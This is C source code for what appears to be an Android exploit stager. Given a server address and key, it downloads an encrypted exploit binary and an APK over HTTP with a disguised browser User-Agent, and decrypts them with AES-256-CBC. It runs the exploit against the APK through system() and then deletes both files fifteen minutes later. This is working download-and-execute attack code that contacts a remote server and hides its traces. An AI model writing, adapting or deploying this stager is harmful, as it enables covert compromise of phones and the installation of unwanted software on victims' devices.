#define _GNU_SOURCE
#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <dirent.h>

#include "aes256.h"

/* Uncomment the following line to enable logging, sha1 checking etc. */
/* #define DEBUG */

#define LOG_FILE "x.log"
#define LOG_MESSAGE_SIZE 512
#define TEMPBUF_SIZE 1024

#define COMMANDLINE_SIZE 512
#define MSG_SIZE 128
#define HEADER_SIZE 2048

#define MAX_RECV_TRIES 3

#define TMP_DIR "tmp"

#define MAX_FILES 20

#define MIN(a,b) ((a) < (b) ? (a) : (b))
#define MAX(a,b) ((a) > (b) ? (a) : (b))

struct params_t {
  char key[0x100];
  char ex_uri[0x100];
  char apk_uri[0x100];
  char ex_filename[0x100];
  char apk_filename[0x100];
  char ip[0x100];
};

static char server_ip[16];
static int  server_port = 0;
static int encrypted = 0;
static unsigned char decryption_key[32];
static struct params_t *params;

#ifdef DEBUG

void do_wlogf(const char *format, ...) {
  va_list args;
  int fd;
  char message[LOG_MESSAGE_SIZE];
  time_t now = time(NULL);
  char *timestr = asctime(localtime(&now));

  va_start(args, format);
  timestr[strlen(timestr)-1] = '\0'; /* get rid of trailing \n */

  fd = open(LOG_FILE, O_RDWR | O_CREAT | O_APPEND, S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH);
  write(fd, timestr, strlen(timestr));
  write(fd, ": ", 2);
  vsnprintf(message, LOG_MESSAGE_SIZE, format, args);
  write(fd, message, strlen(message));
  write(fd, "\n", 1);
  close(fd);
}

void do_wlog(char *str) {
  int fd;
  time_t now = time(NULL);
  char *timestr = asctime(localtime(&now));
  char message[LOG_MESSAGE_SIZE];
  timestr[strlen(timestr)-1] = '\0'; /* get rid of trailing \n */
  
  fd = open(LOG_FILE, O_RDWR | O_CREAT | O_APPEND, S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH);
  snprintf(message, LOG_MESSAGE_SIZE, "%s: %s\n", timestr, str);
  write(fd, message, strlen(message));
  close(fd);
}

#define wlog(str) do_wlog((str))
#define wlogf(...) do_wlogf(__VA_ARGS__)

/* requires busybox */
int debug_log_sha1(char *filename) {
  char cmd[COMMANDLINE_SIZE];
  char sha1[64];
  int fd;

  int exitstatus;
  snprintf(cmd, COMMANDLINE_SIZE, "busybox sha1sum %s > tmp_sha1", filename);
  exitstatus = system(cmd);
  exitstatus = WEXITSTATUS(exitstatus);

  if (exitstatus != 0) {
    wlogf("ERROR: command '%s' returned exit status %d", cmd, exitstatus);
    return -1;
  }

  /* remove_later("tmp_sha1"); */

  fd = open("tmp_sha1", O_RDONLY);
  if (fd < 0) {
    wlogf("ERROR: can't open file tmp_sha1: %s", strerror(errno));
    return -1;
  }

  if(read(fd, sha1, 40) == 0) {
    wlogf("ERROR: can't read file tmp_sha1");
    return -1;
  }

  sha1[40] = '\0';

  wlogf("%s: %s", filename, sha1);
  return 1;
}


#else

#define wlog(str)
#define wlogf(...)

#endif	/* DEBUG */

static void memxor(unsigned char *dest, unsigned char *key, int length) {
  int i;
  for (i = 0; i < length; i++) {
    dest[i] = dest[i] ^ key[i];
  }
}


static int http_header_status(char *header, int headerlen) {
  int status;
  char *statusno;

  if (strncmp(header, "HTTP/1.", strlen("HTTP/1.")) != 0) {
    wlogf("Error: Invalid or unexpected HTTP header. Can't find HTTP/1.x version");
    return -1;
  }

  statusno = header + strlen("HTTP/1.0 ");
  status = (statusno[0] - 0x30) * 100 +
    (statusno[1] - 0x30) * 10 +
    (statusno[2] - 0x30);
  
  return status;
}

/*
  Reads the content-length header field.
  Returns the content length value if found, -1 if not found.
*/
static int http_header_contentlength(char *header, int headerlen) {
  char *contentlength, *valueterm;
  int result;
  /*
    http://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html#sec4.2
    
    Each header field consists of a name followed by a colon (":") and the
    field value. Field names are case-insensitive. The field value MAY be
    preceded by any amount of LWS, though a single SP is preferred.
   */

  contentlength = strcasestr(header, "content-length:");
  
  if (contentlength == NULL) {
    return -1;
  }

  contentlength += strlen("content-length:");

  while (isspace(*contentlength)) {
    contentlength++;
  }

  valueterm = strstr(contentlength, "\r\n");
  *valueterm = '\0';
  result = atoi(contentlength);
  *valueterm = '\r';
  
  return result;
}

/*
  Download a file from the server and writes it to disk.
  Return values:
   1 - OK
  -1 - Connection/download error
*/
static int http_download_file(char *uri, char *filename) {
  int fd, sockfd;
  char msg[MSG_SIZE + 1];
  unsigned char buf[MSG_SIZE];	/* ARM doesn't distinguish between signed and unsigned
				   chars, but aes wants unsigned while snprintf and the
				   like want signed chars. */
  char requestmsg[HEADER_SIZE];
  char header[HEADER_SIZE];
  char *headerterm;
  int size, written, readlen, total_received, total_written, headerlen,
    headersize, headerend, contentstart, contentlength, status, buflen;
  int recvtries = 0;
  int i = 0, skipfirst = 0;
  unsigned char xorblock[16];
  unsigned char ciphertext[16];
  char portstr[16];
  struct sockaddr_in server_addr;
  struct in_addr addr;
  struct timeval tv;
  aes256_context aesctx;

  portstr[0] = '\0';

  /* Create a socket with server */
  if (inet_pton(AF_INET, server_ip, &addr) != 1) {
    wlogf("ERROR: inet_pton failed");
    return -1;
  }

  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(server_port);
  server_addr.sin_addr = addr;

  if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    wlog("Unable to create socket");
    return -1;
  }

  /* Set socket timeout */
  tv.tv_sec = 30;  /* 30 Secs Timeout */
  tv.tv_usec = 0;

  if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (struct timeval *)&tv, sizeof(struct timeval)) < 0) {
    wlogf("WARNING: can't set socket timeout");
  }
  
  if(connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr))) {
    wlog("Unable to connect");
    return -1;
  }

  wlog("Connected!");
  
  total_written = 0;
  total_received = 0;

  if (server_port != 80) {
    snprintf(portstr, 10, ":%d", server_port);
  }

  memset(msg, 0, sizeof(requestmsg));

#ifdef DEBUG
  snprintf(requestmsg, sizeof(requestmsg),
	   "GET %s HTTP/1.0\r\n"		 \
	   "Accept-Encoding: identity\r\n"	 \
	   "\r\n",
	   uri);
#else
  /* User-Agent: like Geko instead of Gecko */
  snprintf(requestmsg, sizeof(requestmsg),
	   "GET %s HTTP/1.0\r\n"		 \
	   "Host: %s%s\r\n"			 \
	   "Accept-Encoding: identity\r\n"	 \
	   "User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30\r\n"                       \
	   "\r\n",
	   uri, server_ip, portstr);
#endif	/* DEBUG */

  wlogf("Header:\n%s\n", requestmsg);

  if(send(sockfd, requestmsg, strlen(requestmsg), 0) < 0) {
    wlogf("Error while sending data");
    return -1;
  }

  header[0] = '\0';
  headersize = HEADER_SIZE;
  headerlen = 0;
  contentstart = 0;

  memset(msg, 0, sizeof(msg));
  while(headerlen < HEADER_SIZE) {
    readlen = recv(sockfd, msg, MSG_SIZE, 0);

    if(readlen < 0) {
      wlogf("Error while receiving data: %d %s", errno, strerror(errno));
      if (errno == 11 && recvtries < MAX_RECV_TRIES) {
	recvtries++;
	continue;
      }
      close(sockfd);
      return -1;
    }

    if(readlen == 0) {
      wlog("Server closed connection before header end");
      close(sockfd);
      return -1;
    }

    msg[readlen] = '\0';

    headerterm = strstr(msg, "\r\n\r\n");
    if (headerterm != NULL) {	/* Header end was found */
      headerend = (int)(headerterm - msg);
      
      if ((headerend + 4) != readlen) {
	contentstart = headerend + 4;
      }
    
      if (headerlen + headerend >= headersize) {
	wlogf("Error: header too big: %d", headerlen + headerend);
	close(sockfd);
	return -1;
	/* headersize = headersize * 2; */
	/* header = realloc(header, headersize); */
      }
      strncat(header, msg, headerend);
      headerlen += headerend;
      break;
    }

    /* Header end not found, append the whole block */
    if (headerlen + readlen >= headersize) {
      wlogf("Error: header too big: %d", headerlen + readlen);
      close(sockfd);
      return -1;
    }
    strncat(header, msg, readlen);
    headerlen += readlen;
    
  }

  header[headerlen] = '\0';
  wlogf("\n..............\nReceived header (%d):\n%s\n..............", headerlen, header);

  status = http_header_status(header, headerlen);
  if (status == -1) {
    wlog("Error while reading HTTP status");
    return -1;
  }

  if (status != 200) {
    wlogf("HTTP response error: %d", status);
    return -1;
  }
  
  /* The content length can be missing or can represent the actual content length */
  contentlength = http_header_contentlength(header, headerlen);

  wlogf("http status: %d", status);
  wlogf("content-length: %d", contentlength);

  buflen = 0;

  /* If there is content after the header, begin filling the buffer */
  if (contentstart != 0) {
    memcpy(buf, msg + contentstart, readlen - contentstart);
    buflen = readlen - contentstart;
  }

  if( (fd = open(filename, O_WRONLY|O_CREAT|O_TRUNC, S_IRWXU|S_IRWXG|S_IRWXO)) == -1) {
    wlogf("ERROR: can't create file %s: %s", filename, strerror(errno));
    return -1;
  }

  if (encrypted) {
    aes256_init(&aesctx, decryption_key);
  }

  total_received = buflen;

  /* Start file download */
  memset(msg, 0, sizeof(msg));
  while((readlen = recv(sockfd, msg, MSG_SIZE, 0)) != 0) {

    if(readlen < 0) {
      wlogf("Error while receiving data: %d %s", errno, strerror(errno));
      if (errno == 11 && recvtries < MAX_RECV_TRIES) {
	recvtries++;
	continue;
      }

      close(sockfd);
      close(fd);
      return -1;
    }

    total_received += readlen;

    /* wlogf(" . total_received %06d bytes", total_received); */

    size = MIN(readlen, sizeof(buf)-buflen);
    
    memcpy(buf + buflen, msg, size);
    buflen += size;

    if (readlen > size) { /* Buffer is full and there's still pending data */

      /* Perform AES256-CBC decryption and write buffer to disk */

      if (encrypted) {
	skipfirst = 0;
	for (i = 0; i < sizeof(buf)/16; i++) {
	  if (total_written == 0 && i == 0) { 	/* First block is the IV */
	    memcpy(xorblock, buf, 16);
	    skipfirst = 1;
	    continue;
	  }
	  memcpy(ciphertext, buf + i*16, 16); /* Save the ciphertext */
	  aes256_decrypt_ecb(&aesctx, buf + i*16); /* Decrypt content */
	  memxor(buf + i*16, xorblock, 16);	   /* Xor to get plaintext */
	  memcpy(xorblock, ciphertext, 16);
	}
      }

      written = write(fd, &(buf[skipfirst*16]), buflen - skipfirst*16);
      if (written < 0) {
	wlogf("ERROR: can't write to file: %s", strerror(errno));
	close(sockfd);
	close(fd);
	return -1;
      }

      total_written += buflen - skipfirst*16;
      /* wlogf(" . total_written  %06d bytes", total_written); */

      memcpy(buf, msg + size, readlen - size);
      buflen = readlen - size;
    }

    memset(msg, 0, sizeof(msg));
  }

  close(sockfd);

  if (buflen == 0) {
    wlog("WARNING: file is empty");
    close(fd);
    return -1;
  }

  /* If the file is not empty buf will always contain the last blocks */

  if (encrypted) {
    if (buflen % 16 != 0) {
      wlogf("DECRYPTION ERROR: Received data is not a multiple of blocksize (16)");
      return -1;
    }

    /* Perform AES256-CBC decryption */
    skipfirst = 0;
    for (i = 0; i < buflen/16; i++) {
      if (total_written == 0 && i == 0) { 	/* First block is the IV */
	memcpy(xorblock, buf, 16);
	skipfirst = 1;
	continue;
      }
      memcpy(ciphertext, buf + i*16, 16); /* Save the ciphertext */
      aes256_decrypt_ecb(&aesctx, buf + i*16); /* Decrypt content */
      memxor(buf + i*16, xorblock, 16);	   /* Xor to get plaintext */
      memcpy(xorblock, ciphertext, 16);
    }

    /* Remove PKCS#7 padding */

    buflen = buflen - buf[buflen - 1];

    /* XXX no padding validity check is performed */
  }

  written = write(fd, &(buf[skipfirst*16]), buflen - skipfirst*16);
  if (written < 0) {
    wlogf("ERROR: can't write(%d, %p, %d) to file: %s",
	  fd, &(buf[skipfirst*16]),
	  buflen - skipfirst*16, strerror(errno));
    
    close(fd);
    return -1;
  }

  total_written += written;
  buflen = 0;

  wlogf("Total bytes written: %d", total_written);
  
  if (encrypted) {
    aes256_done(&aesctx);
  }
  
  if (contentlength != -1 && contentlength != total_received) {
    wlogf("Error transferring data: "					\
	  "supplied content length and transferred bytes do not match!" \
	  " Expecting %d, received %d", contentlength, total_received);
    return -1;
  }

  if (close(fd) < 0) {
    wlogf("WARNING: could not close file descriptor: %s", strerror(errno));
  } else {
    wlogf("download_file: file closed");
  }

  return 1;
}

static int download_retryonfail(char *uri, char *filename, int maxtries) {
  int tries = 0;
  while (tries < maxtries) {
    wlogf("download %s: attempt %d/%d", filename, tries + 1, maxtries);
    if (http_download_file(uri, filename) < 0) {
      wlog("attempt failed.");
      tries++;
    } else {
      return 1;
    }
  }
  wlogf("ERROR: cannot download %s", filename);
  return -1;
}

static int download_exec_exploit() {
  char cmd[COMMANDLINE_SIZE];
  char cwd[COMMANDLINE_SIZE];
  int exitstatus;

  if(download_retryonfail(params->ex_uri, params->ex_filename, 3) < 0) {
    wlog("Error downloading exploit");
    return -1;
  }

  if(download_retryonfail(params->apk_uri, params->apk_filename, 3) < 0) {
    wlog("Error downloading apk");
    return -1;
  }

  if(getcwd(cwd, COMMANDLINE_SIZE) == NULL) {
    wlog("ERROR: can't get current working directory");
    return -1;
  }

  snprintf(cmd, COMMANDLINE_SIZE, "./%s %s/%s", params->ex_filename, cwd, params->apk_filename);
  wlogf("system('%s')...", cmd);
  exitstatus = system(cmd);
  if (exitstatus == -1) {
    wlogf("ERROR: could not execute system: %s", strerror(errno));
  }
  exitstatus = WEXITSTATUS(exitstatus);
  wlogf("system() returned exit status %d", exitstatus);

  if (exitstatus != 0) {
    wlog("WARNING: system() did not complete successfully.");
  }


  return 0;
}

int am_start(char *directory, unsigned int port, struct params_t *p)
{
  char cmd[COMMANDLINE_SIZE];

  wlog("Starting...");

  chdir(directory);

  params = p;

  strncpy(server_ip, params->ip, sizeof(server_ip));

  server_port = port;
  wlogf("Server: %s:%d", server_ip, server_port);

  encrypted = 1;
  memcpy(decryption_key, params->key, 32);

  if (download_exec_exploit() < 0) {
    wlog("FAIL :( could not download package.");
  } else {
    wlog("DONE :) exploit executed.");
  }

  wlog("Starting cleanup ...");

  // Cleanup after 15 minutes
  snprintf(cmd, COMMANDLINE_SIZE, "(sleep 900; rm %s; rm %s) &",
	   params->ex_filename, params->apk_filename);
  wlogf("system('%s')...", cmd);
  system(cmd);

  wlog("Goodbye!");
  wlog("------------------");

  _exit(0);
}
